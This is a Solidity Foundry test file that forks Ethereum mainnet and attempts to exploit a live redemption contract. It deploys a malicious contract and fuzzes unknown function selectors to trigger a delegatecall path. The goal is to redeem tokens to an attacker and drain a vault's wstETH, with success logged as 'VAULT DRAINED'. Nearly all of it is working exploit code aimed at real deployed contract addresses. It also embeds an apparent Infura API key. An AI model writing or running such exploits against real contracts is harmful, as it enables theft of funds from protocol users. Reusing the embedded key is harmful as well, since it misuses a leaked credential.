// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

// Malicious contract to be delegatecalled
contract MaliciousAction {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    
    function attack(address to, uint256 amount) external {
        // When called via delegatecall from Redemption, msg.sender will be the original caller
        // but address(this) will be Redemption's address
        // So this.call to RC will come from Redemption's address
        (bool success, ) = RC.call(
            abi.encodeWithSignature("redeem(uint256,address)", amount, to)
        );
        require(success, "Redeem failed");
    }
    
    // Standard executeAction interface in case it uses DeFiSaver pattern
    function executeAction(
        bytes memory _callData,
        bytes32[] memory _subData,
        uint8[] memory _paramMapping,
        bytes32[] memory _returnValues
    ) public payable returns (bytes32) {
        address to = address(uint160(uint256(_subData[0])));
        uint256 amount = uint256(_subData[1]);
        
        (bool success, ) = RC.call(
            abi.encodeWithSignature("redeem(uint256,address)", amount, to)
        );
        require(success, "Redeem failed");
        return bytes32(amount);
    }
}

contract DelegatecallPathExploit is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    MaliciousAction malicious;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
        malicious = new MaliciousAction();
    }

    function test_AnalyzeDelegatecallSlot() public view {
        console.log("=== ANALYZING DELEGATECALL SLOT ===\n");

        bytes memory code = REDEMPTION_0.code;

        // The SLOAD at 5298 loads from a slot
        // Let's trace back to see what slot it loads from

        console.log("Bytecode analysis around offset 5280-5330:");
        
        // Look for the slot being pushed before SLOAD
        for (uint i = 5280; i < 5330 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            
            // Print important opcodes
            if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0x55) console.log(i, "SSTORE");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0x20) console.log(i, "SHA3/KECCAK256");
            else if (op == 0x35) console.log(i, "CALLDATALOAD");
            else if (op == 0x52) console.log(i, "MSTORE");
            else if (op == 0x51) console.log(i, "MLOAD");
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                if (size <= 4) {
                    bytes memory val = new bytes(size);
                    for (uint j = 0; j < size && i+1+j < code.length; j++) {
                        val[j] = code[i+1+j];
                    }
                    console.log(i, "PUSH", size);
                    console.logBytes(val);
                }
            }
        }
    }

    function test_CheckKnownRedemptionFunctions() public {
        console.log("=== CHECKING KNOWN REDEMPTION FUNCTIONS ===\n");

        vm.startPrank(attacker);

        // Try calling various functions that might trigger delegatecall
        
        // First, deal some IAU to attacker
        deal(IAU, attacker, 10000e18);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // The unknown selectors - maybe one triggers the delegatecall path
        bytes4[] memory unknowns = new bytes4[](10);
        unknowns[0] = bytes4(0xed45b661);
        unknowns[1] = bytes4(0xb2118a8d);
        unknowns[2] = bytes4(0xcff50c6e);
        unknowns[3] = bytes4(0x900fd1ed);
        unknowns[4] = bytes4(0xa82b69ff);
        unknowns[5] = bytes4(0x196e6b1d);
        unknowns[6] = bytes4(0x2ab60045);
        unknowns[7] = bytes4(0x04824e70);
        unknowns[8] = bytes4(0x192a8e86);
        unknowns[9] = bytes4(0xffffffff);

        console.log("\nTrying unknown selectors with bytes data:");

        for (uint i = 0; i < unknowns.length; i++) {
            // Try with attacker address as param
            (bool success, ) = REDEMPTION_0.call(
                abi.encodeWithSelector(unknowns[i], attacker, uint256(100e18))
            );
            if (success) {
                console.log("  SUCCESS with selector:");
                console.logBytes4(unknowns[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
        }
    }

    function test_SearchForActionExecutor() public view {
        console.log("=== SEARCHING FOR ACTION EXECUTOR ===\n");

        // If Redemption uses DeFiSaver-like actions, there might be an
        // executeAction or similar function

        bytes memory code = REDEMPTION_0.code;

        // Check for known action-related selectors
        bytes4[] memory actionSels = new bytes4[](10);
        actionSels[0] = bytes4(keccak256("executeAction(bytes,bytes32[],uint8[],bytes32[])"));
        actionSels[1] = bytes4(keccak256("executeActionDirect(bytes)"));
        actionSels[2] = bytes4(keccak256("callAction(address,bytes)"));
        actionSels[3] = bytes4(keccak256("executeRecipe(address[],bytes[])"));
        actionSels[4] = bytes4(keccak256("runAction(address,bytes)"));
        actionSels[5] = bytes4(keccak256("performAction(bytes)"));
        actionSels[6] = bytes4(keccak256("doAction(bytes)"));
        actionSels[7] = bytes4(keccak256("action(bytes)"));
        actionSels[8] = bytes4(0x8fca9153); // DeFiSaver's executeAction
        actionSels[9] = bytes4(keccak256("execute(bytes)"));

        console.log("Searching for action-related selectors:");
        for (uint s = 0; s < actionSels.length; s++) {
            for (uint i = 0; i + 3 < code.length; i++) {
                bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
                if (sel == actionSels[s]) {
                    console.logBytes4(actionSels[s]);
                    console.log("  Found at offset:", i);
                    break;
                }
            }
        }
    }

    function test_TryFinalizeRedeemWithFakeData() public {
        console.log("=== TRYING FINALIZE REDEEM WITH FAKE DATA ===\n");

        // What if we can manipulate the redemption data structure
        // such that when finalizeRedeem is called, it uses our address?

        // First, let's understand the redemption storage structure
        // by looking at the mapping slots

        // Find where redemption data is stored
        // It's likely a mapping(address => RedemptionRequest[])
        // Array storage: keccak256(user . slot) gives array length slot
        // Elements at keccak256(keccak256(user . slot)) + index

        address realUser = address(0x123); // hypothetical user
        
        // Try to find if there's existing redemption data
        for (uint base = 5; base < 20; base++) {
            bytes32 arrayLenSlot = keccak256(abi.encode(realUser, base));
            bytes32 arrayLen = vm.load(REDEMPTION_0, arrayLenSlot);
            if (arrayLen != bytes32(0)) {
                console.log("Found array at base slot", base);
                console.log("Length:");
                console.logBytes32(arrayLen);
            }
        }
    }

    function test_ExploitViaDelegateToMalicious() public {
        console.log("=== EXPLOIT VIA DELEGATE TO MALICIOUS ===\n");

        console.log("Malicious contract deployed at:", address(malicious));

        // If we can make Redemption delegatecall to our malicious contract,
        // our contract can then call RC.redeem

        // The question is: how do we trigger the delegatecall?
        // The SLOAD at 5298 suggests it reads an address from storage

        // Let's check if there's any way to write to that slot
        // or if the function that uses this delegatecall is callable

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);

        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Try to trigger the path by calling unknown functions
        vm.startPrank(attacker);

        // If there's a function like executeAction(address target, bytes data)
        // we could pass our malicious contract as target

        // Try calling with address parameter that points to malicious
        bytes4[] memory candidates = new bytes4[](5);
        candidates[0] = bytes4(0xed45b661);
        candidates[1] = bytes4(0xb2118a8d);
        candidates[2] = bytes4(0xcff50c6e);
        candidates[3] = bytes4(0x900fd1ed);
        candidates[4] = bytes4(0x04824e70);

        for (uint i = 0; i < candidates.length; i++) {
            // Try as (address,bytes)
            (bool success, ) = REDEMPTION_0.call(
                abi.encodeWithSelector(
                    candidates[i],
                    address(malicious),
                    abi.encodeWithSignature("attack(address,uint256)", attacker, 100e18)
                )
            );
            if (success) {
                console.log("Success with:");
                console.logBytes4(candidates[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        if (attackerAfter > attackerBefore) {
            console.log("\n*** EXPLOIT SUCCESSFUL! ***");
            console.log("Attacker gained:", (attackerAfter - attackerBefore) / 1e18, "wstETH");
        }
    }
}
